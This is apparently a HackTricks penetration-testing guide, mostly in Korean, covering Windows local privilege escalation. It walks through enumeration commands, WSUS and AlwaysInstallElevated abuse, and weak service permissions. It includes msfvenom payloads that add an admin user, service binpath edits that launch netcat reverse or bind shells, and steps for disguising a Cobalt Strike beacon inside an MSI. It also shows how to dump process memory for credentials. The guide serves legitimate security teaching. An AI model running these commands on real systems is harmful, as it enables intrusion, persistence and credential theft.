# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation 벡터를 찾는 데 가장 좋은 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 초기 Windows 이론

### 액세스 토큰

**Windows Access Tokens가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 정보는 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### 무결성 수준

**Windows의 무결성 수준이 무엇인지 모른다면 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 보안 제어

Windows에는 시스템을 **열거하는 것을 방해할 수 있는**, 실행 파일을 실행하지 못하게 하거나 심지어 **활동을 탐지할 수 있는** 다양한 요소가 있습니다. privilege escalation enumeration을 시작하기 전에 다음 **페이지**를 **읽고** 이 모든 **방어 메커니즘**을 **열거**해야 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## 시스템 정보

### 버전 정보 열거

Windows 버전에 알려진 취약점이 있는지 확인하세요 (적용된 패치도 함께 확인하세요).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 버전 Exploits

이 [사이트](https://msrc.microsoft.com/update-guide/vulnerability)는 Microsoft 보안 취약점에 대한 자세한 정보를 검색하는 데 유용합니다. 이 데이터베이스에는 4,700개 이상의 보안 취약점이 있어 Windows 환경이 제시하는 **거대한 attack surface**를 보여줍니다.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas에는 watson이 포함되어 있음)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploits용 Github 리포지토리:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 환경

env variables에 credential/Juicy 정보가 저장되어 있나요?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 기록
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript 파일

이 기능을 켜는 방법은 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 파이프라인 실행의 세부 정보는 기록되며, 실행된 명령어, 명령 호출 및 스크립트의 일부가 포함됩니다. 그러나 전체 실행 세부 사항과 출력 결과는 모두 캡처되지 않을 수 있습니다.

이를 활성화하려면 문서의 "Transcript files" 섹션에 있는 지침을 따르되, **"Module Logging"**을 선택하고 **"Powershell Transcription"** 대신 사용하세요.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowerShell 로그의 마지막 15개 이벤트를 보려면 다음을 실행하세요:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

스크립트 실행의 모든 활동과 전체 내용이 캡처되어, 실행되는 각 코드 블록이 기록됩니다. 이 과정은 각 활동에 대한 포괄적인 감사 추적을 보존하여 forensics 및 악성 행위 분석에 유용합니다. 실행 시점의 모든 활동을 문서화함으로써 프로세스에 대한 자세한 인사이트를 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block에 대한 로깅 이벤트는 Windows 이벤트 뷰어의 다음 경로에서 찾을 수 있습니다: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\\ 마지막 20개 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

업데이트가 http**S**가 아닌 http로 요청될 경우 시스템을 탈취할 수 있습니다.

다음 명령을 cmd에서 실행하여 네트워크가 non-SSL WSUS update를 사용하는지 확인하는 것으로 시작합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
또는 PowerShell에서 다음을 실행:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
다음과 같은 응답을 받는 경우:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
그리고 만약 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 또는 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 값이 `1`이면.

그렇다면, **악용 가능하다.** 마지막 레지스트리 값이 0이면 WSUS 항목은 무시된다.

이 취약점을 악용하려면 다음과 같은 도구를 사용할 수 있다: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - 이들은 non-SSL WSUS 트래픽에 'fake' 업데이트를 주입하기 위한 MiTM 무장 익스플로잇 스크립트다.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
기본적으로, 이 버그가 악용하는 결함은 다음과 같다:

> 로컬 사용자 프록시를 수정할 권한이 있고 Windows Updates가 Internet Explorer 설정에 구성된 프록시를 사용한다면, 로컬에서 [PyWSUS](https://github.com/GoSecure/pywsus)를 실행하여 자신의 트래픽을 가로채고 자산에서 권한 상승된 사용자로서 코드를 실행할 수 있다.
>
> 또한 WSUS 서비스는 현재 사용자의 설정을 사용하므로 해당 사용자의 인증서 저장소도 사용한다. WSUS 호스트네임에 대한 self-signed 인증서를 생성하고 이를 현재 사용자의 인증서 저장소에 추가하면 HTTP 및 HTTPS WSUS 트래픽을 모두 가로챌 수 있다. WSUS는 인증서에 대해 HSTS 유사 메커니즘을 사용한 trust-on-first-use 유형의 검증을 구현하지 않는다. 제시된 인증서가 사용자에 의해 신뢰되고 올바른 hostname을 포함하면 서비스는 이를 수락한다.

이 취약점은 도구 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)를 사용하여 악용할 수 있다(공개되면).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

많은 엔터프라이즈 에이전트는 localhost IPC 인터페이스와 권한 있는 업데이트 채널을 노출한다. 등록(enrollment)이 공격자 서버로 강제될 수 있고 업데이터가 악성 루트 CA를 신뢰하거나 약한 서명 검사를 수행하면, 로컬 사용자는 SYSTEM 서비스가 설치하는 악성 MSI를 전달할 수 있다. 일반화된 기법(Netskope stAgentSvc 체인 기반 – CVE-2025-0309)은 다음을 참조하라:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows **domain** 환경에서 특정 조건 하에 **로컬 권한 상승** 취약점이 존재한다. 이러한 조건에는 **LDAP signing이 강제되지 않은** 환경, 사용자가 **Resource-Based Constrained Delegation (RBCD)** 를 구성할 수 있는 자체 권한을 가진 경우, 그리고 도메인 내에서 컴퓨터를 생성할 수 있는 기능이 포함된다. 이러한 **요구사항**은 **기본 설정**으로 충족된다는 점에 유의해야 한다.

익스플로잇은 [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)에서 찾을 수 있다.

공격 흐름에 대한 자세한 내용은 다음을 확인하라: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** 이 두 레지스트리 항목이 **enabled** 되어 있다면 (값이 **0x1**), 권한에 상관없이 사용자는 `*.msi` 파일을 NT AUTHORITY\\**SYSTEM** 권한으로 **설치**(실행)할 수 있다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

`Write-UserAddMSI` 명령을 power-up에서 사용하면 현재 디렉터리에 권한 상승을 위해 Windows MSI 바이너리를 생성할 수 있습니다. 이 스크립트는 사용자/그룹 추가를 요구하는 사전 컴파일된 MSI 설치 파일을 작성합니다(따라서 GIU 접근 권한이 필요합니다):
```
Write-UserAddMSI
```
생성된 바이너리를 실행하기만 하면 권한을 상승시킬 수 있습니다.

### MSI Wrapper

이 튜토리얼을 읽어 이 도구들을 사용해 MSI wrapper를 만드는 방법을 배우세요. **.bat** 파일은 단순히 명령줄을 실행하려는 경우 래핑할 수 있습니다.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
- Right-click the project and select **View > Custom Actions**.
- Right-click **Install** and select **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
- Finally, **build it**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

To execute the **installation** of the malicious `.msi` file in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 이용하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## 안티바이러스 및 탐지기

### 감사 설정

이 설정들은 무엇이 **기록되는지** 결정하므로 주의해야 합니다
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding은 로그가 어디로 전송되는지 아는 것이 흥미롭다
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 도메인에 가입된 컴퓨터에서 각 암호가 **고유하고 무작위로 생성되며 정기적으로 갱신되도록** 보장하는 **로컬 관리자 암호 관리**를 위해 설계되었습니다. 이러한 암호는 Active Directory에 안전하게 저장되며 ACLs를 통해 충분한 권한이 부여된 사용자만 접근할 수 있어, 권한이 있는 경우 로컬 관리자 암호를 조회할 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화된 경우, **평문 암호는 LSASS에 저장됩니다** (Local Security Authority Subsystem Service).\
[**이 페이지의 WDigest에 대한 자세한 정보**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**부터 Microsoft는 Local Security Authority (LSA)에 대한 보호를 강화하여 신뢰할 수 없는 프로세스가 **메모리를 읽거나** 코드를 주입하려는 시도를 **차단**해 시스템을 더욱 안전하게 했습니다.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**는 **Windows 10**에 도입되었습니다. 그 목적은 장치에 저장된 자격 증명을 pass-the-hash 공격과 같은 위협으로부터 보호하는 것입니다.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials**는 **Local Security Authority** (LSA)에 의해 인증되며 운영 체제 구성 요소에서 사용됩니다. 사용자의 로그온 데이터가 등록된 보안 패키지에 의해 인증되면, 일반적으로 해당 사용자의 domain credentials가 생성됩니다.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 사용자 및 그룹

### 사용자 및 그룹 열거

자신이 속한 그룹 중 흥미로운 권한이 있는지 확인하세요.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 특권 그룹

**특권 그룹의 구성원인 경우 권한 상승을 시도할 수 있습니다**. 특권 그룹과 이를 악용해 권한을 상승시키는 방법은 다음에서 확인하세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### 토큰 조작

이 페이지에서 **token**이 무엇인지 **자세히 알아보세요**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
다음 페이지를 확인하여 **흥미로운 token**과 이를 악용하는 방법을 알아보세요:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 로그인한 사용자 / 세션
```bash
qwinsta
klist sessions
```
### 홈 폴더
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 암호 정책
```bash
net accounts
```
### 클립보드 내용 가져오기
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 프로세스

### 파일 및 폴더 권한

먼저, 프로세스를 나열할 때 **프로세스의 명령줄에 비밀번호가 포함되어 있는지 확인**하세요.\
실행 중인 바이너리를 **덮어쓸 수 있는지** 또는 바이너리 폴더에 쓰기 권한이 있어 잠재적인 [**DLL Hijacking attacks**](dll-hijacking/index.html)를 악용할 수 있는지 확인하세요:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
항상 [**electron/cef/chromium debuggers**가 실행 중인지 확인하세요, 이를 악용해 권한 상승이 가능합니다](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**프로세스 바이너리의 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 binaries가 위치한 폴더 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 메모리 비밀번호 추출

실행 중인 프로세스의 메모리 덤프는 sysinternals의 **procdump**를 사용하여 생성할 수 있습니다. FTP와 같은 서비스는 **credentials in clear text in memory**를 보관하는 경우가 있으니, 메모리를 덤프해 해당 credentials를 읽어보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 취약한 GUI 앱

**SYSTEM으로 실행되는 애플리케이션은 사용자가 CMD를 실행하거나 디렉터리를 탐색할 수 있게 허용할 수 있습니다.**

예: "Windows Help and Support" (Windows + F1), "command prompt"를 검색하고 "Click to open Command Prompt"를 클릭

## 서비스

Service Triggers는 특정 조건이 발생하면 Windows가 서비스를 시작하도록 합니다 (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). SERVICE_START 권한이 없어도 트리거를 작동시켜 권한 있는 서비스를 시작할 수 있는 경우가 많습니다. 열거 및 활성화 기법은 다음을 참조하세요:

-
{{#ref}}
service-triggers.md
{{#endref}}

서비스 목록 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

서비스 정보를 얻기 위해 **sc**를 사용할 수 있습니다
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하려면 _Sysinternals_의 **accesschk** 바이너리를 갖추는 것이 권장됩니다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"가 어떤 서비스든 수정할 수 있는지 확인하는 것이 권장됩니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

다음 오류가 발생하면(예: SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

다음 명령을 사용하여 활성화할 수 있습니다
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**서비스 upnphost가 작동하려면 SSDPSRV에 의존한다는 점을 고려하세요 (XP SP1의 경우)**

**이 문제에 대한 또 다른 우회 방법은 다음을 실행하는 것입니다:**
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

서비스에 대해 "Authenticated users" 그룹이 **SERVICE_ALL_ACCESS** 권한을 보유하고 있는 경우, 서비스의 실행 바이너리를 수정할 수 있습니다. **sc**를 수정 및 실행하려면:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
권한 상승은 다음 권한들을 통해 발생할 수 있습니다:

- **SERVICE_CHANGE_CONFIG**: 서비스 바이너리를 재구성할 수 있습니다.
- **WRITE_DAC**: 권한 재구성을 허용하여 서비스 구성을 변경할 수 있게 합니다.
- **WRITE_OWNER**: 소유권 획득 및 권한 재구성을 허용합니다.
- **GENERIC_WRITE**: 서비스 구성 변경 권한을 포함합니다.
- **GENERIC_ALL**: 또한 서비스 구성 변경 권한을 포함합니다.

이 취약점의 탐지 및 악용에는 _exploit/windows/local/service_permissions_를 사용할 수 있습니다.

### 서비스 바이너리의 약한 권한

**서비스가 실행하는 바이너리를 수정할 수 있는지 확인하세요** 또는 바이너리가 위치한 폴더에 **쓰기 권한이 있는지** 확인하세요 ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
서비스가 실행하는 모든 바이너리는 **wmic**(system32에 있는 것이 아님)을 사용해 얻을 수 있고, 권한은 **icacls**로 확인할 수 있습니다:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
또한 **sc** 및 **icacls**를 사용할 수 있습니다:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 서비스 레지스트리 수정 권한

임의의 서비스 레지스트리를 수정할 수 있는지 확인해야 합니다.\
다음과 같이 서비스 **레지스트리**에 대한 **권한**을 **확인**할 수 있습니다:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
서비스에 대해 **Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지 확인해야 합니다. 그런 경우 서비스가 실행하는 바이너리를 변경할 수 있습니다.

실행되는 바이너리의 Path를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

레지스트리에 대해 이 권한이 있으면 **이 레지스트리에서 하위 registry를 생성할 수 있습니다**. Windows services의 경우 이는 **임의의 코드를 실행하기에 충분합니다:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

실행 파일의 경로가 따옴표로 묶여 있지 않으면 Windows는 공백 이전의 각 끝부분을 실행하려고 시도합니다.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
내장된 Windows 서비스에 속한 경로를 제외하고, 인용되지 않은 서비스 경로를 모두 나열:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**탐지하고 exploit할 수 있습니다** 이 취약점을 metasploit으로: `exploit/windows/local/trusted\_service\_path` You can manually create a service binary with metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 복구 작업

Windows에서는 서비스가 실패할 경우 수행할 작업을 지정할 수 있습니다. 이 기능은 특정 바이너리를 가리키도록 구성할 수 있으며, 해당 바이너리를 교체할 수 있다면 privilege escalation이 가능할 수도 있습니다. 자세한 내용은 [공식 문서](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)를 참조하세요.

## 애플리케이션

### 설치된 애플리케이션

**바이너리의 권한**을 확인하세요 (하나를 덮어써서 privilege escalation이 가능할 수도 있습니다) 및 **폴더**의 권한도 확인하세요 ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

특정 config 파일을 수정하여 어떤 특수 파일을 읽을 수 있는지, 또는 Administrator 계정에 의해 실행될 바이너리(schedtasks)를 수정할 수 있는지 확인하세요.

시스템에서 약한 폴더/파일 권한을 찾는 한 가지 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 시작 시 실행

**다른 사용자로 실행될 registry 또는 binary를 덮어쓸 수 있는지 확인하세요.**\
**읽어보세요** **다음 페이지**에서 흥미로운 **autoruns locations to escalate privileges**에 대해 더 알아보세요:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 드라이버

가능한 **타사 제품의 이상하거나 취약한** 드라이버를 찾아보세요
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
